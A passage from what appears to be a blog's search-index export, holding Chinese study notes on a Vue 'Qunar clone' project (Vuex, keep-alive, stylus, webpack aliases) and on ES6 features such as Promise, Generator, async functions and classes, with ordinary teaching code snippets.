...mapState([&apos;city&apos;])&#125; GetterVuex 允许我们在 store 中定义“getter”（可以认为是 store 的计算属性）。就像计算属性一样，getter 的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。12345678910111213141516const store = new Vuex.Store(&#123; state: &#123; todos: [ &#123; id: 1, text: &apos;...&apos;, done: true &#125;, &#123; id: 2, text: &apos;...&apos;, done: false &#125; ] &#125;, getters: &#123; doneTodos: state =&gt; &#123; return state.todos.filter(todo =&gt; todo.done) &#125; &#125;&#125;)store.getters.doneTodos // -&gt; [&#123; id: 1, text: &apos;...&apos;, done: true &#125;] mapGetters 辅助函数仅仅是将 store 中的 getter 映射到局部计算属性12345678910import &#123; mapGetters &#125; from &apos;vuex&apos;export default &#123; computed: &#123; ...mapGetters([ &apos;doneTodosCount&apos;, &apos;anotherGetter&apos;, ]) &#125;&#125; Mutation更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 事件类型 (type) 和 一个 回调函数 (handler)。123456789mutations: &#123; increment (state, payload) &#123; state.count += payload.amount &#125;&#125;store.commit(&apos;increment&apos;, &#123; amount: 10&#125;) 你可以在组件中使用 this.$store.commit(‘xxx’) 提交 mutation，或者使用 mapMutations 辅助函数将组件中的 methods 映射为 store.commit 调用。12345678910import &#123; mapMutations &#125; from &apos;vuex&apos;export default &#123; // ... methods: &#123; ...mapMutations([ &apos;increment&apos;, // 将 `this.increment()` 映射为 `this.$store.commit(&apos;increment&apos;)` ]) &#125; ActionAction 类似于 mutation，不同在于： Action 提交的是 mutation，而不是直接变更状态。 Action 可以包含任意异步操作。 1234567891011121314151617const store = new Vuex.Store(&#123; state: &#123; count: 0 &#125;, mutations: &#123; increment (state) &#123; state.count++ &#125; &#125;, actions: &#123; increment (context) &#123; context.commit(&apos;increment&apos;) &#125; &#125;&#125;)store.dispatch(&apos;increment&apos;) 我们可以在 action 内部执行异步操作。1234567891011121314actions: &#123; actionA (&#123; commit &#125;) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; commit(&apos;someMutation&apos;) resolve() &#125;, 1000) &#125;) &#125;&#125;store.dispatch(&apos;actionA&apos;).then(() =&gt; &#123; // ...&#125;) ModuleVuex 允许我们将 store 分割成模块（module）。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块。12345678910111213141516171819202122const moduleA = &#123; state: &#123; ... &#125;, mutations: &#123; ... &#125;, actions: &#123; ... &#125;, getters: &#123; ... &#125;&#125;const moduleB = &#123; state: &#123; ... &#125;, mutations: &#123; ... &#125;, actions: &#123; ... &#125;&#125;const store = new Vuex.Store(&#123; modules: &#123; a: moduleA, b: moduleB &#125;&#125;)store.state.a // -&gt; moduleA 的状态store.state.b // -&gt; moduleB 的状态 LocalStorage 使用123456let defaultCity = &apos;杭州&apos;try &#123; if (localStorage.city) &#123; defaultCity = localStorage.city &#125;&#125; catch (e) &#123;&#125; Keep-alive简介keep-alive 是 Vue 内置的一个组件，可以使被包含的组件保留状态，或避免重新渲染。 用法12345&lt;keep-alive&gt; &lt;router-view&gt; &lt;!-- 该组件将被缓存！ --&gt; &lt;/router-view&gt;&lt;/keep-alive&gt; 参数 include - 字符串或正则表达，只有匹配的组件会被缓存 exclude - 字符串或正则表达式，任何匹配的组件都不会被缓存 使用123456789101112export default &#123; name: &apos;a&apos;, data () &#123; return &#123;&#125; &#125;&#125;&lt;keep-alive exclude=&quot;a&quot;&gt; &lt;router-view&gt; &lt;!-- 除了 name 为 a 的组件都将被缓存！ --&gt; &lt;/router-view&gt;&lt;/keep-alive&gt;可以保留它的状态或避免重新渲染 钩子函数当组件中 &lt;router-view&gt; 内被切换，它的 activatied 和deactivated 这两个生命周期钩子函数将会被执行，同时，被缓存的页面， mounted 钩子将只在第一次请求时被执行。 activated：keep-alive 组件激活时调用。 deactivated：keep-alive 组件停用时调用。 递归组件的使用1234567891011&lt;div&gt; &lt;div class=&quot;item&quot; v-for=&quot;(item, index) of list&quot; :key=&quot;index&quot;&gt; &lt;div class=&quot;item-title border-bottom&quot;&gt; &lt;span class=&quot;item-title-icon&quot;&gt;&lt;/span&gt; &#123;&#123;item.title&#125;&#125; &lt;/div&gt; &lt;div v-if=&quot;item.children&quot; class=&quot;item-children&quot;&gt; &lt;detail-list :list=&quot;item.children&quot;&gt;&lt;/detail-list&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 添加动画效果123456789101112131415161718&lt;template&gt; &lt;transition&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/transition&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &apos;Fade&apos;&#125;&lt;/script&gt;&lt;style lang=&quot;stylus&quot; scoped&gt;.v-enter, .v-leave-to opacity: 0.v-enter-active, .v-leave-active transition: opacity .5s&lt;/style&gt; 项目打包上线1npm run build dist 目录为打包好的文件。 项目目录解读1234567891011121314151617181920212223242526272829├── index.html├── main.js├── static│ └── mock # 模拟JSON数据├── assets # 静态资源│ ├── style │ └── pic ├── common # 共用全局组件│ ├── fade │ └── gallary├── pages # 每个页面划分成一个组件│ ├── city # 页面内部再划分小组件│ │ ├── component│ │ └── City.vue│ ├── detail │ │ ├── component│ │ └── Detail.vue│ └── home│ ├── component│ └── Home.vue├── router │ └── index.js # 路由配置└── store ├── index.js # 组装模块并导出 store 的地方 ├── actions.js # 根级别的 action ├── mutations.js # 根级别的 mutation └── modules ├── cart.js └── products.js CSS技巧垂直居中1234567//单个元素line-height == height//父元素内子元素居中display: flexflex-direction: columnjustify-content: center 响应式大小在静态CSS文件中设置 font-size 对应的像素值，使用 rem 动态获得实际像素。 元素间距inline-block 显示的元素之间，会存在2px的间距，为了取消这个间距，可以设置父元素的 font-size 为 0 。 stylus变量12345678910// assets/styles -&gt; varibles.styl$bgColor = #00bcd4$darkTextColor = #333$headerHeight = .86rem//xxx.vue@import &apos;~styles/varibles&apos;line-height: $headerHeightbackground: $bgColor stylus混合12345678910111213// assets/styles -&gt; mixins.stylellipsis() overflow: hidden white-space: nowrap text-overflow: ellipsis//xxx.vue@import &apos;@~styles/mixins.styl&apos;;.item-title line-height: .54rem font-size: .32rem ellipsis() 代码优化路径别名有时候路径名过长，在引入的过程较为不便，所以我们可以通过更改配置项，为路径添加别名。123456789101112//build -&gt; webpack.base.config.jsresolve: &#123; extensions: [&apos;.js&apos;, &apos;.vue&apos;, &apos;.json&apos;], alias: &#123; &apos;vue$&apos;: &apos;vue/dist/vue.esm.js&apos;, &apos;@&apos;: resolve(&apos;src&apos;), &apos;styles&apos;: resolve(&apos;src/assets/styles&apos;), &apos;common&apos;: resolve(&apos;src/common&apos;), &#125;&#125;@import &apos;@~styles/mixins.styl&apos;; 函数节流对于某些高频事件，我们可以通过函数节流的方法，限制频率，从而达到节约性能的效果。1234567891011121314151617181920keyword () &#123; if (this.timer) &#123; clearTimeout(this.timer) &#125; if (!this.keyword) &#123; this.list = [] return &#125; this.timer = setTimeout(() =&gt; &#123; const result = [] for (let i in this.cities) &#123; this.cities[i].forEach((value) =&gt; &#123; if (value.spell.indexOf(this.keyword) &gt; -1 || value.name.indexOf(this.keyword) &gt; -1) &#123; result.push(value) &#125; &#125;) &#125; this.list = result &#125;, 100)&#125; 全局事件的绑定与解绑有时我们会在子组件里对全局事件做绑定，但是为了不影响到其它页面，我们应该在合适的时间取消对全局事件的绑定，该操作分为两种情况。 在使用keep-alive对页面做缓存时：在 activated 钩子函数里绑定 全局事件，在 deactivated 函数里解绑。 在不使用keep-alive对页面做缓存时：在 mounted 钩子函数里绑定 全局事件，在 beforeDestory 函数里解绑。 总结至此，vue仿去哪儿项目的学习总结就结束了。写一百个项目，不如深入理解学习一个项目，并从中吸取经验，项目虽小，但收获颇多。有关项目的更深入理解，等我研究了vue的源码后再继续补充。]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES6知识点梳理]]></title>
    <url>%2FES6%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86.html</url>
    <content type="text"><![CDATA[最近拜读了阮一峰老师的ES6详解，虽然ES9已经大摇大摆亮相，但是ES6依然是一个跨时代的版本，其中不乏很多目前使用率颇高，功能性能上大为改进的新语法，所以还是决定对ES6做一个学习总结，也对其中部分闪光语法做详细解释。 思维导图 Promise对象含义:Promise 是异步编程的一种解决方案，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从它可以获取异步操作的消息。 特点: 对象的状态不受外界影响。 一旦状态改变，就不会再变，任何时候都可以得到这个结果。 基本用法：12345678var promise = new Promise(function(resolve, reject) &#123; // ... some code if (/* 异步操作成功 */)&#123; resolve(value); &#125; else &#123; reject(error); &#125; &#125;); Promise 实例生成以后，可以用 then 方法分别指定 resolved 状态和 rejected 状态的回调函数。12345promise.then(function(value) &#123; // success &#125;, function(error) &#123; // failure &#125;); Promise.prototype.then()Promise 实例具有 then 方法，也就是说， then 方法是定义在原型对 象 Promise.prototype 上的。1234567getJSON(&quot;/post/1.json&quot;).then(function(post) &#123; return getJSON(post.commentURL); &#125;).then(function funcA(comments) &#123; console.log(&quot;resolved: &quot;, comments); &#125;, function funcB(err)&#123; console.log(&quot;rejected: &quot;, err); &#125;); Promise.prototype.catch()Promise.prototype.catch 方法是 .then(null, rejection) 的别名，用于指定发生错误时的回调函数。1234567getJSON(&apos;/post/1.json&apos;).then(function(post) &#123; return getJSON(post.commentURL); &#125;).then(function(comments) &#123; // some code &#125;).catch(function(error) &#123; // 处理前面三个Promise产生的错误 &#125;); Promise.all()1var p = Promise.all([p1, p2, p3]); Promise.all 方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。 Promise.all 方法接受一个数组作为参数。 只有 p1 、 p2 、 p3 的状态都变成 fulfilled ， p 的状态才会变 成 fulfilled ，此时 p1 、 p2 、 p3 的返回值组成一个数组，传递给 p 的回调函数。 只要 p1 、 p2 、 p3 之中有一个被 rejected ， p 的状态就变成 rejected ，此时第一个被 reject 的实例的返回值，会传递给 p 的回调函数。 12345678var promises = [2, 3, 5, 7, 11, 13].map(function (id) &#123; return getJSON(&apos;/post/&apos; + id + &quot;.json&quot;); &#125;); Promise.all(promises).then(function (posts) &#123; // ... &#125;).catch(function(reason)&#123; // ... &#125;); Promise.race()1var p = Promise.race([p1, p2, p3]); Promise.race 方法同样是将多个Promise实例，包装成一个新的Promise实例。 方法接受一个数组作为参数。 只要 p1 、 p2 、 p3 之中有一个实例率先改变状态， p 的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给 p 的回调函数。 12345678const p = Promise.race([ fetch(&apos;/resource-that-may-take-a-while&apos;), new Promise(function (resolve, reject) &#123; setTimeout(() =&gt; reject(new Error(&apos;request timeout&apos;)), 5000) &#125;) ]); p.then(response =&gt; console.log(response)); p.catch(error =&gt; console.log(error)); Promise.resolve()参数分成四种情况: 参数是一个Promise实例：不做任何修改、原封不动地返回这个实例。 参数是一个 thenable 对象：将这个对象转为Promise对象，然后就立即执行 thenable 对象的 then 方法。123456789let thenable = &#123; then: function(resolve, reject) &#123; resolve(42); &#125; &#125;;let p1 = Promise.resolve(thenable); p1.then(function(value) &#123; console.log(value); // 42 &#125;); 参数不是具有 then 方法的对象，或根本就不是对象：返回一个新的Promise对象，状态为resolved。12345var p = Promise.resolve(&apos;Hello&apos;); p.then(function (s)&#123; console.log(s) &#125;); // Hello 不带有任何参数：直接返回一个 resolved 状态的Promise对象。1234var p = Promise.resolve(); p.then(function () &#123; // ... &#125;); 执行顺序1234567891011setTimeout(function () &#123; console.log(&apos;three&apos;); &#125;, 0); Promise.resolve().then(function () &#123; console.log(&apos;two&apos;); &#125;); console.log(&apos;one&apos;);//one//two//three setTimeout(fn, 0) 在下一轮“事件循环”开始时执行。 Promise.resolve() 在本轮“事件循环”结束时执行。 console.log(‘one’) 则是立即执行，因此最先输出。 Promise.reject()返回一个新的 Promise 实例，该实例的状态为 rejected。1234567var p = Promise.reject(&apos;出错了&apos;); // 等同于 var p = new Promise((resolve, reject) =&gt; reject(&apos;出错了&apos;)) p.then(null, function (s) &#123; console.log(s) &#125;); // 出错了 done()总是处于回调链的尾端，保证抛出任何可能出现的错误。12345asyncFunc() .then(f1) .catch(r1) .then(f2) .done(); finally() finally 方法用于指定不管Promise对象最后状态如何，都会执行的操作。 它与 done 方法的最大区别，它接受一个普通的回调函数作为参数，该函数不管怎样都必须执行。 12345server.listen(0) .then(function () &#123; // run test &#125;) .finally(server.stop); Promise.try() 让同步函数同步进行，异步函数异步进行。 可以更好的管理异常。 123Promise.try(database.users.get(&#123;id: userId&#125;)) .then(...) .catch(...) Iterator和for…of循环Iterator（遍历器）的概念它是一种接口，为各种不同的数据结构提供统一的访问机制。任何数据结构只要部署Iterator接口，就可以完成遍历操作（即依次处理该数据结构的所有成员）。遍历过程： 创建一个指针对象，指向当前数据结构的起始位置。也就是说，遍历器对象本质上，就是一个指针对象。 第一次调用指针对象的 next 方法，可以将指针指向数据结构的第一个成员。 第二次调用指针对象的 next 方法，指针就指向数据结构的第二个成员。 不断调用指针对象的 next 方法，直到它指向数据结构的结束位置。 1234567891011121314var it = makeIterator([&apos;a&apos;, &apos;b&apos;]); it.next() // &#123; value: &quot;a&quot;, done: false &#125; it.next() // &#123; value: &quot;b&quot;, done: false &#125; it.next() // &#123; value: undefined, done: true &#125; function makeIterator(array) &#123; var nextIndex = 0; return &#123; next: function() &#123; return nextIndex &lt; array.length ? &#123;value: array[nextIndex++], done: false&#125; : &#123;value: undefined, done: true&#125;; &#125; &#125;; &#125; 调用 Iterator 接口的场合解构赋值对数组和 Set 结构进行解构赋值时，会默认调用 Symbol.iterator 方法。12345let set = new Set().add(&apos;a&apos;).add(&apos;b&apos;).add(&apos;c&apos;); let [x,y] = set; // x=&apos;a&apos;; y=&apos;b&apos; let [first, ...rest] = set; // first=&apos;a&apos;; rest=[&apos;b&apos;,&apos;c&apos;]; 扩展运算符扩展运算符（…）也会调用默认的 Iterator 接口。12var str = &apos;hello&apos;; [...str] // [&apos;h&apos;,&apos;e&apos;,&apos;l&apos;,&apos;l&apos;,&apos;o&apos;] yield*yield* 后面跟的是一个可遍历的结构，它会调用该结构的遍历器接口。123456789101112let generator = function* () &#123; yield 1; yield* [2,3,4]; yield 5; &#125;;var iterator = generator(); iterator.next() // &#123; value: 1, done: false &#125; iterator.next() // &#123; value: 2, done: false &#125; iterator.next() // &#123; value: 3, done: false &#125; iterator.next() // &#123; value: 4, done: false &#125; iterator.next() // &#123; value: 5, done: false &#125; iterator.next() // &#123; value: undefined, done: true &#125; 其他场合由于数组的遍历会调用遍历器接口，所以任何接受数组作为参数的场合，其实都调用了遍历器接口。 for…of Array.from() Map(), Set(), WeakMap(), WeakSet()（比如 new Map([[‘a’,1], [‘b’,2]]) ） Promise.all() Promise.race() 字符串的 Iterator 接口字符串是一个类似数组的对象，也原生具有 Iterator 接口。1234567var someString = &quot;hi&quot;; typeof someString[Symbol.iterator] // &quot;function&quot; var iterator = someString[Symbol.iterator](); iterator.next() // &#123; value: &quot;h&quot;, done: false &#125; iterator.next() // &#123; value: &quot;i&quot;, done: false &#125; iterator.next() // &#123; value: undefined, done: true &#125; 遍历器对象的return()，throw() 遍历器对象除了具有 next 方法，还可以具有 return 方法和 throw 方法。 return 方法的使用场合是，如果 for…of 循环提前退出（通常是因为出错， 或者有 break 语句或 continue 语句），就会调用 return 方法。如果一个对象在完成遍历前，需要清理或释放资源，就可以部署 return 方法。 123456789101112131415161718192021222324252627282930function readLinesSync(file) &#123; return &#123; next() &#123; return &#123; done: false &#125;; &#125;, return() &#123; file.close(); return &#123; done: true &#125;; &#125;, &#125;; &#125;//return会被调用的情况// 情况一 for (let line of readLinesSync(fileName)) &#123; console.log(line); break; &#125;// 情况二 for (let line of readLinesSync(fileName)) &#123; console.log(line); continue; &#125;// 情况三 for (let line of readLinesSync(fileName)) &#123; console.log(line); throw new Error(); &#125; Generator函数概述 Generator 函数是一个状态机，封装了多个内部状态。 执行 Generator 函数会返回一个遍历器对象，也就是说，Generator 函数除了状态机，还是一个遍历器对象生成函数。 调用 Generator 函数后，该函数并不执行，返回的也不是函数运行结果，而是一个指向内部状态的指针对象 123456789101112131415function* helloWorldGenerator() &#123; yield &apos;hello&apos;; yield &apos;world&apos;; return &apos;ending&apos;; &#125;var hw = helloWorldGenerator();hw.next() // &#123; value: &apos;hello&apos;, done: false &#125; hw.next() // &#123; value: &apos;world&apos;, done: false &#125; hw.next() // &#123; value: &apos;ending&apos;, done: true &#125; hw.next() // &#123; value: undefined, done: true &#125; yield 表达式next 方法的运行逻辑: 遇到 yield 表达式，就暂停执行后面的操作，并将紧跟在 yield 后面的那个表达式的值，作为返回的对象的 value 属性值。 下一次调用 next 方法时，再继续往下执行，直到遇到下一个 yield 表达式。 如果没有再遇到新的 yield 表达式，就一直运行到函数结束，直到 return 语句为止，并将 return 语句后面的表达式的值，作为返回的对象的 value 属性值。 如果该函数没有 return 语句，则返回的对象的 value 属性值为 undefined 。 注意点： yield 表达式只能用在 Generator 函数里面，用在其他地方都会报错。 yield 表达式如果用在另一个表达式之中，必须放在圆括号里面。123456function* demo() &#123; console.log(&apos;Hello&apos; + yield); // SyntaxError console.log(&apos;Hello&apos; + yield 123); // SyntaxError console.log(&apos;Hello&apos; + (yield)); // OK console.log(&apos;Hello&apos; + (yield 123)); // OK &#125; next 方法的参数yield 表达式本身没有返回值，或者说总是返回 undefined 。 next 方法可以带一个参数，该参数就会被当作上一个 yield 表达式的返回值。123456789101112function* f() &#123; for(var i = 0; true; i++) &#123; var reset = yield i; if(reset) &#123; i = -1; &#125; &#125; &#125;var g = f(); g.next() // &#123; value: 0, done: false &#125; g.next() // &#123; value: 1, done: false &#125; g.next(true) // &#123; value: 0, done: false &#125; for…of 循环for…of 循环可以自动遍历 Generator 函数时生成的 Iterator 对象，且此时不再需要调用 next 方法。123456789101112131415161718192021222324function* numbers () &#123; yield 1 yield 2 return 3 yield 4 &#125;// 扩展运算符 [...numbers()] // [1, 2] // Array.from 方法 Array.from(numbers()) // [1, 2] // 解构赋值 let [x, y] = numbers(); x // 1 y // 2 // for...of 循环 for (let n of numbers()) &#123; console.log(n) &#125;// 1// 2 Generator.prototype.throw() Generator 函数返回的遍历器对象，都有一个 throw 方法，可以在函数体外抛出错误，然后在 Generator 函数体内捕获。 Generator 函数体内抛出的错误，也可以被函数体外的 catch 捕获。 1234567891011121314151617var g = function* () &#123; try &#123; yield; &#125; catch (e) &#123; console.log(&apos;内部捕获&apos;, e); &#125; &#125;;var i = g(); i.next(); try &#123; i.throw(&apos;a&apos;); i.throw(&apos;b&apos;); &#125; catch (e) &#123; console.log(&apos;外部捕获&apos;, e); &#125;// 内部捕获 a // 外部捕获 b Generator.prototype.return()Generator 函数返回的遍历器对象，还有一个 return 方法，可以返回给定的值，并且终结遍历 Generator 函数。123456789function* gen() &#123; yield 1; yield 2; yield 3; &#125;var g = gen(); g.next() // &#123; value: 1, done: false &#125; g.return(&apos;foo&apos;) // &#123; value: &quot;foo&quot;, done: true &#125; g.next() // &#123; value: undefined, done: true &#125; yield* 表达式 用来在一个 Generator 函数里面执行另一个Generator 函数。 yield* 命令可以很方便地取出嵌套数组的所有成员。 12345678910111213function* foo() &#123; yield &apos;a&apos;; yield &apos;b&apos;; &#125;function* bar() &#123; yield &apos;x&apos;; yield* foo(); yield &apos;y&apos;; &#125;// &quot;x&quot; // &quot;a&quot; // &quot;b&quot; // &quot;y&quot; Generator 函数的 thisGenerator 函数总是返回一个遍历器，ES6 规定这个遍历器是 Generator 函数的实例，也继承了 Generator 函数的 prototype 对象上的方法。1234567function* g() &#123;&#125; g.prototype.hello = function () &#123; return &apos;hi!&apos;; &#125;;let obj = g(); obj instanceof g // true obj.hello() // &apos;hi!&apos; 使用Generator 与状态机12345678910111213141516171819//ES5var ticking = true; var clock = function() &#123; if (ticking) console.log(&apos;Tick!&apos;); else console.log(&apos;Tock!&apos;); ticking = !ticking;&#125;//ES6var clock = function* () &#123; while (true) &#123; console.log(&apos;Tick!&apos;); yield; console.log(&apos;Tock!&apos;); yield; &#125; &#125;; 应用异步操作的同步化表达1234567891011121314function* main() &#123; var result = yield request(&quot;http://some.url&quot;); var resp = JSON.parse(result); console.log(resp.value); &#125;function request(url) &#123; makeAjaxCall(url, function(response)&#123; it.next(response); &#125;); &#125;var it = main(); it.next(); 控制流管理1234567891011121314151617181920function* longRunningTask(value1) &#123; try &#123; var value2 = yield step1(value1); var value3 = yield step2(value2); var value4 = yield step3(value3); var value5 = yield step4(value4); // Do something with value4 &#125; catch (e) &#123; // Handle any error from step1 through step4 &#125; &#125;scheduler(longRunningTask(initialValue)); function scheduler(task) &#123; var taskObj = task.next(task.value); // 如果Generator函数未结束，就继续调用 if (!taskObj.done) &#123; task.value = taskObj.value scheduler(task); &#125; &#125; 部署 Iterator 接口12345678910function* makeSimpleGenerator(array)&#123; var nextIndex = 0; while(nextIndex &lt; array.length)&#123; yield array[nextIndex++]; &#125; &#125;var gen = makeSimpleGenerator([&apos;yo&apos;, &apos;ya&apos;]); gen.next().value // &apos;yo&apos; gen.next().value // &apos;ya&apos; gen.next().done // true 作为数据结构123456789function *doStuff() &#123; yield fs.readFile.bind(null, &apos;hello.txt&apos;); yield fs.readFile.bind(null, &apos;world.txt&apos;); yield fs.readFile.bind(null, &apos;and-such.txt&apos;); &#125;for (task of doStuff()) &#123; // task是一个函数，可以像回调函数那样使用它 &#125; Generator函数的异步应用Thunk 函数编译器的“传名调用”实现，往往是将参数放到一个临时函数之中，再将这个临时函数传入函数体。这个临时函数就叫做 Thunk 函数。1234567891011function f(m) &#123; return m * 2; &#125;f(x + 5); // 等同于 var thunk = function () &#123; return x + 5; &#125;;function f(thunk) &#123; return thunk() * 2; &#125; JavaScript 语言的 Thunk 函数在 JavaScript 语言 中，Thunk 函数替换的不是表达式，而是多参数函数，将其替换成一个只接受回调函数作为参数的单参数函数。1234567891011// 正常版本的readFile（多参数版本） fs.readFile(fileName, callback); // Thunk版本的readFile（单参数版本） var Thunk = function (fileName) &#123; return function (callback) &#123; return fs.readFile(fileName, callback); &#125;; &#125;;var readFileThunk = Thunk(fileName); readFileThunk(callback); Thunkify 模块确保回调函数只运行一次。123456789function f(a, b, callback)&#123; var sum = a + b; callback(sum); callback(sum); &#125;var ft = thunkify(f); var print = console.log.bind(console); ft(1, 2)(print); // 3 Generator函数的流程管理Thunk 函数真正的威力，在于可以自动执行 Generator 函数。下面就是一个基于 Thunk 函数的 Generator 执行器。12345678910111213function run(fn) &#123; var gen = fn(); function next(err, data) &#123; var result = gen.next(data); if (result.done) return; result.value(next); &#125; next(); &#125;function* g() &#123; // ... &#125;run(g); co 模块co 模块可以让你不用编写 Generator 函数的执行器。12345678var gen = function* () &#123; var f1 = yield readFile(&apos;/etc/fstab&apos;); var f2 = yield readFile(&apos;/etc/shells&apos;); console.log(f1.toString()); console.log(f2.toString()); &#125;;var co = require(&apos;co&apos;); co(gen); async函数含义它就是 Generator 函数的语法糖。async 函数对 Generator 函数的改进，体现在以下四点。 内置执行器。 更好的语义。 更广的适用性。 返回值是 Promise。 基本用法当函数执行的时候，一旦遇到 await 就会先返回，等到异步操作完成，再接着执行函数体内后面的语句。12345678async function getStockPriceByName(name) &#123; var symbol = await getStockSymbol(name); var stockPrice = await getStockPrice(symbol); return stockPrice; &#125;getStockPriceByName(&apos;goog&apos;).then(function (result) &#123; console.log(result); &#125;); async 函数内部抛出错误，会导致返回的 Promise 对象变为 reject 状态。抛出的错误对象会被 catch 方法回调函数接收到。12345678async function f() &#123; throw new Error(&apos;出错了&apos;); &#125;f().then( v =&gt; console.log(v), e =&gt; console.log(e) )// Error: 出错了 Promise 对象的状态变化async 函数返回的 Promise 对象，必须等到内部所有 await 命令后面的 Promise 对象执行完，才会发生状态改变，除非遇到 return 语句或者抛出错误。 await 命令正常情况下， await 命令后面是一个 Promise 对象。如果不是，会被转成一个即 resolve 的 Promise 对象。12345async function f() &#123; return await 123; &#125;f().then(v =&gt; console.log(v)) // 123 只要一个 await 语句后面的 Promise 变为 reject ，那么整个 async 函数都会中断执行。1234async function f() &#123; await Promise.reject(&apos;出错了&apos;); await Promise.resolve(&apos;hello world&apos;); // 不会执行 &#125; 错误处理 最好将 await 放在 try…catch 代码块之中。 1234567async function myFunction() &#123; try &#123; await somethingThatReturnsAPromise(); &#125; catch (err) &#123; console.log(err); &#125; &#125; 多个 await 命令后面的异步操作，如果不存在继发关系，最好让它们同时触发。 1let [foo, bar] = await Promise.all([getFoo(), getBar()]); await 命令只能用在 async 函数之中，如果用在普通函数，就会报错。 1234567async function dbFuc(db) &#123; let docs = [&#123;&#125;, &#123;&#125;, &#123;&#125;]; // 报错 docs.forEach(function (doc) &#123; await db.post(doc); &#125;); &#125; 异步遍历器for await…of123456789async function () &#123; try &#123; for await (const x of createRejectingIterable()) &#123; console.log(x); &#125; &#125; catch (e) &#123; console.error(e); &#125; &#125; Class 的基本语法基本概念12345678910//定义类 class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return &apos;(&apos; + this.x + &apos;, &apos; + this.y + &apos;)&apos;; &#125; &#125; 类的所有方法都定义在类的 prototype 属性上面。12345// 等同于 Point.prototype = &#123; constructor() &#123;&#125;, toString() &#123;&#125;, &#125;; Object.assign 方法可以很方便地一次向类添加多个方法。1234Object.assign(Point.prototype, &#123; toString()&#123;&#125;, toValue()&#123;&#125; &#125;); 类的内部所有定义的方法，都是不可枚举的。 constructor 方法constructor 方法是类的默认方法，通过 new 命令生成对象实例时，自动调用该方法。一个类必须有 constructor 方法，如果没有显式定义，一个空的 constructor 方法会被默认添加。12345class Point &#123; &#125;// 等同于 class Point &#123; constructor() &#123;&#125; &#125; 类的实例对象 生成类的实例对象的写法，与 ES5 完全一样，也是使用 new 命令。 12345class Point &#123; // ... &#125;// 报错 var point = Point(2, 3); // 正确 var point = new Point(2, 3); 与 ES5 一样，实例的属性除非显式定义在其本身（即定义在 this 对象上），否则都是定义在原型上（即定义在 class 上）。 12345678910111213141516//定义类 class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return &apos;(&apos; + this.x + &apos;, &apos; + this.y + &apos;)&apos;; &#125; &#125;var point = new Point(2, 3); point.toString() // (2, 3) point.hasOwnProperty(&apos;x&apos;) // true point.hasOwnProperty(&apos;y&apos;) // true point.hasOwnProperty(&apos;toString&apos;) // false point.__proto__.hasOwnProperty(&apos;toString&apos;) // true 与 ES5 一样，类的所有实例共享一个原型对象。 1234var p1 = new Point(2,3); var p2 = new Point(3,2); p1.__proto__ === p2.__proto__ //true Class 表达式 与函数一样，类也可以使用表达式的形式定义。 采用 Class 表达式，可以写出立即执行的 Class。 123456789let person = new class &#123; constructor(name) &#123; this.name = name; &#125; sayName() &#123; console.log(this.name); &#125; &#125;(&apos;张三&apos;); person.sayName(); // &quot;张三&quot; 不存在变量提升类不存在变量提升（hoist），这一点与 ES5 完全不同。 私有方法方法一将私有方法移出模块,内部调用 call 进行绑定。123456789class Widget &#123; foo (baz) &#123; bar.call(this, baz); &#125; // ... &#125;function bar(baz) &#123; return this.snaf = baz; &#125; 方法二利用 Symbol 值的唯一性，将私有方法的名字命名为一个 Symbol 值。12345678910111213const bar = Symbol(&apos;bar&apos;); const snaf = Symbol(&apos;snaf&apos;); export default class myClass&#123; // 公有方法 foo(baz) &#123; this[bar](baz); &#125; // 私有方法 [bar](baz) &#123; return this[snaf] = baz; &#125; // ... &#125;; 私有属性在属性名之前，使用 # 表示。12345678910111213class Point &#123; #x; constructor(x = 0) &#123; #x = +x; // 写成 this.#x 亦可 &#125; get x() &#123; return #x &#125; set x(value) &#123; #x = +value &#125; &#125; this 的指向类的方法内部如果含有 this ，它默认指向类的实例。123456789101112class Logger &#123; printName(name = &apos;there&apos;) &#123; this.print(`Hello $&#123;name&#125;`); &#125; print(text) &#123; console.log(text); &#125; &#125;const logger = new Logger(); const &#123; printName &#125; = logger; printName(); // TypeError: Cannot read property &apos;print&apos; of undef ined Class 的取值函数（getter）和存值函数（setter）在“类”的内部可以使用 get 和 set 关键字，对某个属性设置存值函数和取值函数，拦截该属性的存取行为。12345678910111213141516class MyClass &#123; constructor() &#123; // ... &#125; get prop() &#123; return &apos;getter&apos;; &#125; set prop(value) &#123; console.log(&apos;setter: &apos;+value); &#125; &#125;let inst = new MyClass(); inst.prop = 123; // setter: 123 inst.prop // &apos;getter&apos; Class 的 Generator 方法如果某个方法之前加上星号（ * ），就表示该方法是一个 Generator 函数。12345678910111213141516class Foo &#123; constructor(...args) &#123; this.args = args; &#125; * [Symbol.iterator]() &#123; for (let arg of this.args) &#123; yield arg; &#125; &#125; &#125;for (let x of new Foo(&apos;hello&apos;, &apos;world&apos;)) &#123; console.log(x); &#125;// hello // world Class 的静态方法 如果在一个方法前，加上 static 关键字，就表示该方法不会被实例继承，而是直接通过类来调用，这就称为“静态方法”。 123456789class Foo &#123; static classMethod() &#123; return &apos;hello&apos;; &#125; &#125;Foo.classMethod() // &apos;hello&apos; var foo = new Foo(); foo.classMethod() // TypeError: foo.classMethod is not a function 如果静态方法包含 this 关键字，这个 this 指的是类，而不是实例。 123456789101112class Foo &#123; static bar () &#123; this.baz(); &#125; static baz () &#123; console.log(&apos;hello&apos;); &#125; baz () &#123; console.log(&apos;world&apos;); &#125; &#125;Foo.bar() // hello 父类的静态方法，可以被子类继承，也可以从 super 对象上调用。 12345678910111213141516class Foo &#123; static classMethod() &#123; return &apos;hello&apos;; &#125; &#125;class Bar extends Foo &#123; 